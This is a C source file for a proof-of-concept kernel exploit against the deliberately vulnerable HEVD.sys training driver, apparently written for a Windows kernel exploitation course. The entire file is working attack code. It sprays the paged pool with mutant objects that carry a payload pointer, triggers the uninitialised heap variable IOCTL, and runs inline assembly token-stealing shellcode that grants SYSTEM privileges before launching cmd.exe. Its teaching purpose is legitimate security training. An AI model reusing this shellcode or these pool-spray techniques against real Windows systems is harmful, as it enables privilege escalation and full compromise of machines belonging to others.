 /*  
             DEC 16TH, 2016
    $$\      $$\ $$\   $$\ $$$$$$$$\
    $$ | $\  $$ |$$ | $$  |$$  _____|
    $$ |$$$\ $$ |$$ |$$  / $$ |
    $$ $$ $$\$$ |$$$$$  /  $$$$$\
    $$$$  _$$$$ |$$  $$<   $$  __|
    $$$  / \$$$ |$$ |\$$\  $$ |
    $$  /   \$$ |$$ | \$$\ $$$$$$$$\
    \__/     \__|\__|  \__|\________|

POC exploit for uninitialised heap variable vulnerability on HEVD.sys, part of the Windows Kernel Exploitation Course

It mostly works. By @_m0t

*/

#include <time.h>
#include <stdio.h>
#include <Windows.h>
#include <winioctl.h>
#include <TlHelp32.h>

#define SPRAYSIZEA 10000
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#define STATUS_UNSUCCESSFUL ((NTSTATUS)0xC0000001L)
#define DEVICE_NAME "\\\\.\\HackSysExtremeVulnerableDriver"
#define HACKSYS_EVD_IOCTL_UNINITIALIZED_HEAP_VARIABLE     CTL_CODE(FILE_DEVICE_UNKNOWN, 0x80C, METHOD_NEITHER, FILE_ANY_ACCESS)

#define KTHREAD_OFFSET     0x124  // nt!_KPCR.PcrbData.CurrentThread
#define EPROCESS_OFFSET    0x050  // nt!_KTHREAD.ApcState.Process
#define PID_OFFSET         0x0B4  // nt!_EPROCESS.UniqueProcessId
#define FLINK_OFFSET       0x0B8  // nt!_EPROCESS.ActiveProcessLinks.Flink
#define TOKEN_OFFSET       0x0F8  // nt!_EPROCESS.Token
#define SYSTEM_PID         0x004  // SYSTEM Process PID

#define DEBUG_INFO(fmt, ...) do { ColoredConsoleOuput(FOREGROUND_BLUE, fmt, ##__VA_ARGS__); } while (0)
#define DEBUG_ERROR(fmt, ...) do { ColoredConsoleOuput(FOREGROUND_RED, fmt, ##__VA_ARGS__); } while (0)
#define DEBUG_SUCCESS(fmt, ...) do { ColoredConsoleOuput(FOREGROUND_GREEN, fmt, ##__VA_ARGS__); } while (0)
#define DEBUG_MESSAGE(fmt, ...) do { ColoredConsoleOuput(FOREGROUND_RED | FOREGROUND_BLUE | FOREGROUND_GREEN, fmt, ##__VA_ARGS__); } while (0)

HANDLE MutantsAr[SPRAYSIZEA];
//HANDLE MutantsArB[SPRAYSIZEB];

typedef struct _LSA_UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} LSA_UNICODE_STRING, *PLSA_UNICODE_STRING, UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef NTSTATUS (WINAPI *NtCreateMutant_t)(
  OUT PHANDLE             MutantHandle,
  IN ACCESS_MASK          DesiredAccess,
  IN POBJECT_ATTRIBUTES   ObjectAttributes OPTIONAL,
  IN BOOLEAN              InitialOwner );

typedef NTSTATUS (WINAPI *NtCreateDirectoryObject_t)(
  OUT PHANDLE           DirectoryHandle,
  IN ACCESS_MASK        DesiredAccess,
  IN POBJECT_ATTRIBUTES ObjectAttributes
);
  
NtCreateMutant_t NtCreateMutant;
NtCreateDirectoryObject_t NtCreateDirectoryObject;

VOID ColoredConsoleOuput(WORD wColor, CONST PTCHAR fmt, ...) {
    SIZE_T Length = 0;
    PTCHAR DebugString;
    va_list args = NULL;
    HANDLE hConsoleOutput;
    WORD CurrentAttributes;
    CONSOLE_SCREEN_BUFFER_INFO ConsoleScreenBufferInfo;

    va_start(args, fmt);
    Length = _vscprintf(fmt, args) + 2;
    DebugString = (PTCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, Length * sizeof(TCHAR));
    hConsoleOutput = GetStdHandle(STD_OUTPUT_HANDLE);
    GetConsoleScreenBufferInfo(hConsoleOutput, &ConsoleScreenBufferInfo);
    CurrentAttributes = ConsoleScreenBufferInfo.wAttributes;
    SetConsoleTextAttribute(hConsoleOutput, FOREGROUND_INTENSITY | wColor);

    vfprintf(stderr, fmt, args);
    vsprintf_s(DebugString, Length, fmt, args);
    OutputDebugString(DebugString);

    SetConsoleTextAttribute(hConsoleOutput, CurrentAttributes);
    va_end(args);
    HeapFree(GetProcessHeap(), 0, (LPVOID)DebugString);
}

VOID TokenStealingPayloadWin7Generic() {
    // No Need of Kernel Recovery as we are not corrupting anything
    __asm {
        pushad                               ; Save registers state

        ; Start of Token Stealing Stub
        xor eax, eax                         ; Set ZERO
        mov eax, fs:[eax + KTHREAD_OFFSET]   ; Get nt!_KPCR.PcrbData.CurrentThread
                                             ; _KTHREAD is located at FS:[0x124]

        mov eax, [eax + EPROCESS_OFFSET]     ; Get nt!_KTHREAD.ApcState.Process

        mov ecx, eax                         ; Copy current process _EPROCESS structure

        mov edx, SYSTEM_PID                  ; WIN 7 SP1 SYSTEM process PID = 0x4

        SearchSystemPID:
            mov eax, [eax + FLINK_OFFSET]    ; Get nt!_EPROCESS.ActiveProcessLinks.Flink
            sub eax, FLINK_OFFSET
            cmp [eax + PID_OFFSET], edx      ; Get nt!_EPROCESS.UniqueProcessId
            jne SearchSystemPID

        mov edx, [eax + TOKEN_OFFSET]        ; Get SYSTEM process nt!_EPROCESS.Token
        mov [ecx + TOKEN_OFFSET], edx        ; Replace target process nt!_EPROCESS.Token
                                             ; with SYSTEM process nt!_EPROCESS.Token
        ; End of Token Stealing Stub

        popad                                ; Restore registers state
    }
}

HANDLE GetDeviceHandle(LPCSTR FileName) {
    HANDLE hFile = NULL;

    hFile = CreateFile(FileName,
                       GENERIC_READ | GENERIC_WRITE,
                       FILE_SHARE_READ | FILE_SHARE_WRITE,
                       NULL,
                       OPEN_EXISTING,
                       FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
                       NULL);

    return hFile;
}

void ResolveApi(){
    HMODULE hModule = LoadLibraryA("ntdll.dll");
    
    if (!hModule) {
        DEBUG_ERROR("[-] Failed To Load ntdll.dll: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    NtCreateMutant = (NtCreateMutant_t)GetProcAddress(hModule, "NtCreateMutant");
    
    if (!NtCreateMutant) {
        DEBUG_ERROR("[-] Failed Resolving NtCreateMutant: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }
    
    NtCreateDirectoryObject = (NtCreateDirectoryObject_t)GetProcAddress(hModule, "NtCreateDirectoryObject");
        
    if (!NtCreateDirectoryObject) {
        printf("[-] Failed Resolving NtCreateDirectoryObject: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }
}

char* CreateBasicStringBlock(UINT32 blockSize){
    char *block = (char*) HeapAlloc(GetProcessHeap(), 0, blockSize);
    if (block == NULL){
        DEBUG_ERROR("[-] Failed To Allocate string block: 0x%X\n", GetLastError() );
        exit(EXIT_FAILURE);
    }
    memset(block, 0, blockSize);
    PVOID payload_ptr = &TokenStealingPayloadWin7Generic;

    for (UINT16 i = 0; i <= blockSize - 4; i += 4){
        memcpy(block+i, &payload_ptr, 4);
        if ( i == blockSize - 4 || i + 4 > blockSize - 4){
            block[i+2] = '\x00';
            block[i+3] = '\x00';
        }
    }
    return block;
}

/*
allocate a lot of object where you can control the data. address of payload required here
*/
void SprayPagedPool() {
    NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;
    UINT32 poolBlockOverhead = 0x8; // XXX FIXME
    OBJECT_ATTRIBUTES mutantAttributes;
    HANDLE rootDir;
    UNICODE_STRING mutantName;

    memset(MutantsAr, 0x0, SPRAYSIZEA);
    memset(&mutantAttributes, 0, sizeof(mutantAttributes));
    memset(&mutantName, 0, sizeof(mutantName));
    
    //round 1 - allocations

    UINT32 SprayBlockSize = 0xf8;
    UINT32 MutantNameSize = SprayBlockSize - poolBlockOverhead;
    char *mutantNameStr = CreateBasicStringBlock(MutantNameSize);
    
    NtStatus = NtCreateDirectoryObject(&rootDir, NULL, NULL);
    if (NtStatus != STATUS_SUCCESS){
        printf("[-] Failed call to NtCreateDirectoryObject Error: 0x%X\n", NtStatus);
        exit(EXIT_FAILURE);
    }
    
    mutantAttributes.RootDirectory = rootDir;
    mutantAttributes.Attributes = 0x80;
    mutantAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
    mutantAttributes.ObjectName = &mutantName;
    
    DEBUG_MESSAGE("[+] Spraying with Mutants for size 0x%x\n", SprayBlockSize);

    UINT32 prefixSize = 7;
    char prefix[8];

    for (UINT32 i = 0; i < SPRAYSIZEA; i++) {
        memset(prefix, 0, sizeof(prefix));
        
        sprintf(prefix, "%.7d", i);
        //printf("%s\n", prefix);
        
        memcpy((void*)(mutantNameStr+MutantNameSize-prefixSize-2), prefix, prefixSize);
        
        //printf("%s - %d\n", mutantNameStr, strlen(MutantNameSize));
        
        mutantName.Length = MutantNameSize;
        mutantName.MaximumLength = mutantName.Length;
        mutantName.Buffer = (PWSTR)mutantNameStr;

        NtStatus = NtCreateMutant(&MutantsAr[i], 0x1F0001, &mutantAttributes, TRUE);
        if (NtStatus != STATUS_SUCCESS){
            DEBUG_ERROR("[-] Failed call to NtCreateMutant - Index: %d - Error: 0x%X\n", i, NtStatus);
            exit(EXIT_FAILURE);
        }
    }

    // round II, free
    DEBUG_MESSAGE("[+] Freeing some non contiguous blocks\n");
    for (UINT32 i = 0; i < SPRAYSIZEA; i += 8){
        if (!CloseHandle(MutantsAr[i])) {
            DEBUG_ERROR("[-] Failed To Close Mutant Handle: 0x%X\n", GetLastError());
            exit(EXIT_FAILURE);
        }
    }

}

int main(){
    HANDLE hFile;
    LPCSTR FileName = (LPCSTR)DEVICE_NAME;
    NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;  
    ULONG MagicValue = 0xBAADF00D;
    ULONG BytesReturned;
    STARTUPINFO StartupInfo = {0};
    PROCESS_INFORMATION ProcessInfo = {0};
    
    __try {

        ResolveApi();

        DEBUG_MESSAGE("[+] Setting Thread Priority\n");

        if (!SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST)) {
            DEBUG_ERROR("[-] Failed To Set As THREAD_PRIORITY_HIGHEST\n");
        }
        else {
            DEBUG_INFO("[+] Priority Set To THREAD_PRIORITY_HIGHEST\n");
        }

        // Get the device handle
        DEBUG_MESSAGE("[+] Getting Device Driver Handle\n");
        DEBUG_INFO("[+] Device Name: %s\n", FileName);

        hFile = GetDeviceHandle(FileName);

        if (hFile == INVALID_HANDLE_VALUE) {
            DEBUG_ERROR("[-] Failed Getting Device Handle: 0x%X\n", GetLastError());
            exit(EXIT_FAILURE);
        }
        else {
            DEBUG_INFO("[+] Device Handle: 0x%X\n", hFile);
        }
        
        //DebugBreak();
        SprayPagedPool();
        //DebugBreak();

        DEBUG_MESSAGE("[+] Triggering Use of Uninitialized Heap Variable\n");
        DeviceIoControl(hFile,
                            HACKSYS_EVD_IOCTL_UNINITIALIZED_HEAP_VARIABLE,
                            (LPVOID)&MagicValue,
                            0,
                            NULL,
                            0,
                            &BytesReturned,
                            NULL);
                            
        DEBUG_MESSAGE("[+] Starting cmd.exe...\n");

        StartupInfo.wShowWindow = SW_SHOW;
        StartupInfo.cb          = sizeof(STARTUPINFO);
        StartupInfo.dwFlags     = STARTF_USESHOWWINDOW;

        CreateProcess(NULL,
            "cmd",
            NULL,
            NULL,
            FALSE,
            CREATE_BREAKAWAY_FROM_JOB,
            NULL,
            NULL,
            &StartupInfo,
            &ProcessInfo);

    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        DEBUG_ERROR("[-] Exception: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }
    return EXIT_SUCCESS;
    
    DebugBreak();
}
